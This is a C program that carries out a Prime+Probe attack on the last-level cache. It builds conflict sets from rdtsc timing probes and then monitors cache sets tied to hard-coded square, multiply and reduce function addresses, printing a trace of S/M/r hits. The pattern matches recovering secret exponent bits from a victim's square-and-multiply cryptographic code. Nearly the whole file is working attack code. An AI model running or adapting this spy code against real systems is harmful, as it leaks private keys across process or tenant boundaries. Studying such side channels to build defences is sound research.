#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
//#include <iostream>
#include "cacheutils.h"
#define threshold 250
#define nblocks 24
#define setThreshold 500
//#include <vector>

//using namespace std;
long cache_size = 3145728;
char * conflict_set[48];
char * allSets[4096][24];


int sqr_set = (0x494fb0 & 0x03FFC0) >> 6;
int mul_set = (0x494ad0 & 0x03FFC0)>> 6;
int red_set = (0x493dd0 & 0x03FFC0)>> 6;



char * evictionSetSlice0[12];
int ess0 = 0;
int ess1 = 0;


char * evictionSetSlice1[12];


char *buffer;
char *set0_start;
int cs_count = 0;



struct bufferLineStore
{
	bool valid;
	char *ptr;
};

struct bufferLineStore bufferLines[12*4096];
struct bufferLineStore conflictLines[48];


int bufferLinesCount = 0;
int conflictLinesCount = 0;


//probe function with candidate and array of conflict set
bool probe(char *candidate){
	
	long time;
	maccess((void*)candidate);
	
	for(int j=0;j<cs_count;j++){	
	 	maccess((void*)conflict_set[j]);
	 }

	time = rdtsc();
	maccess((void*)candidate);
	
	bool ret = rdtsc() - time > threshold;
	if(ret){
		return true;
	}
	else{
	//	printf("inserted -- %d\n",bufferLinesCount);
		bufferLines[bufferLinesCount].ptr = (candidate);
		bufferLines[bufferLinesCount].valid = true;
		bufferLinesCount++;	
		return false;
	}
}

//probe function wth candidate and but not create buffer lines
bool probe2(char *candidate){
	
	long time;
	maccess((void*)candidate);
	
	for(int j=0;j<cs_count;j++){	
	 	maccess((void*)conflict_set[j]);
	 }

	time = rdtsc();
	maccess((void*)candidate);
	
	return rdtsc() - time > threshold;
}

//probe function conflict lines datastructure
bool probe1(char *candidate){
	
	long time;
	maccess((void*)candidate);
	//long delta_candidate_before = rdtsc() - time;

	 for(int j=0;j<cs_count;j++){
	// 	printf("conflict_set[%d] accessed\n",cs_count);
	 	if(conflictLines[j].valid)
		 	maccess((void*)conflictLines[j].ptr);
	 }

	 time = rdtsc();
	 maccess((void*)candidate);
	// //long delta_candidate_after = rdtsc() - time;

	return rdtsc() - time > threshold;
	
}

//reset all the buffers
void reset_buffers(void){
	cs_count = 0;
	bufferLinesCount = 0;
	conflictLinesCount = 0;
}


int findThreshold(char *buffer){
	size_t start,end,sum=0;
	size_t a=0,e=0;
	int r;

	for(int i = 0;i<cache_size;i++){

		r = rand() % cache_size;

		asm volatile ("cpuid");


        asm volatile ("lfence");

        asm volatile ("rdtsc");

    	asm volatile("mov %%rax, %%rdi"::: "rax");

    	 asm volatile ("movq (%0), %%r15\n"    :    : "c" (buffer+r)    : "r15");

        asm volatile ("rdtsc");

        asm volatile ("mov %%rax, %0":"=r"(a));

    	asm volatile ("mov %%rdi,%0":"=r"(e));

        asm volatile ("lfence");

        end = a;

        start = e;

    	sum += end - start;
    }

    	// printf("%lu\n", a);
    	// printf("%lu\n", e);
   		// printf("%lu\n", sum);

    return sum/cache_size;

}


int main(){
	
	
	long no_of_cache_sets = 1024;
	
	int count = 48;
	int i;

	

	while(cs_count < 24){
		//resent all the buffers do again
		reset_buffers();

		//creating the starting addresses
		buffer = (char*)mmap(NULL,3*cache_size,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_SHARED | MAP_ANONYMOUS , -1, 0);
		set0_start = (buffer - ((long)buffer % (long)(cache_size)) + (long)(cache_size));
		
		buffer[0] = 'a';

		
//		printf("\n Threshold is ::  %d",findThreshold(buffer));
//		return 0;

		//finding the conflict set
		for(i=0;i<2*12;i++){
			char *candidate = (char *)(set0_start + i*(long)(cache_size/12));
			if(!probe(candidate)){
				conflict_set[cs_count++] = candidate;
				//printf("conflict_set[%d] created------------------\n",cs_count);
				
				if(cs_count >= nblocks){
					break;
				}
			}
		}
	}

	// printf("Conflict set Items in One set :  %d\n",cs_count);
	//copying the conflict set into conflict lines
	for(i=0;i<cs_count;i++){
		conflictLines[i].ptr = conflict_set[i];
		conflictLines[i].valid = true;
	}


	//creating the conflict set for all the sets
	for(i=0;i<4096;i++){
		for(int j=0;j<24;j++){
			char *addr = conflictLines[j].ptr;
			allSets[i][j] = (char*)((long)addr & 0xFFFFFFFC003F) + (i << 6);
			maccess(allSets[i][j]);
		}
	}



	//access the LLC 
	//access Square set
	long set_access_time = 0;
	
	// set_access_time = set_access_time / 4096;
	// printf("set_access_time -- %d\n", set_access_time);
	int sum = 0;
	int cnt = 4000;
	while(cnt > 0){
		sum ++;
		size_t time = rdtsc();
		size_t delta;
		for(i=0;i<24;i++){
			
			//printf("%d\n", sqr_set);
			char *temp = (allSets[sqr_set][i]);
			maccess(temp);		
		}
		delta = rdtsc() - time;
		if( delta > setThreshold){
			printf("|-%d-%ld-S",sum,delta);
		}

		time = rdtsc();
		for(i=0;i<24;i++){
			
			//printf("%d\n", sqr_set);
			char *temp = (allSets[mul_set][i]);
			maccess(temp);		
		}
		delta = rdtsc() - time;
		if(delta > setThreshold){
			printf("|-%d-%ld-M",sum,delta);
		}

		time = rdtsc();
		for(i=0;i<24;i++){
			
			//printf("%d\n", sqr_set);
			char *temp = (allSets[red_set][i]);
			maccess(temp);		
		}
		delta = rdtsc() - time;
		if(delta > setThreshold){
			printf("|-%d-%ld-r",sum,delta);
		}
		time = rdtsc();
		delta = 0;
		while(1){
			delta += rdtsc() - time;
			if(delta > 500)
				break;
		}
		cnt--;
	}


 	return 0;
}
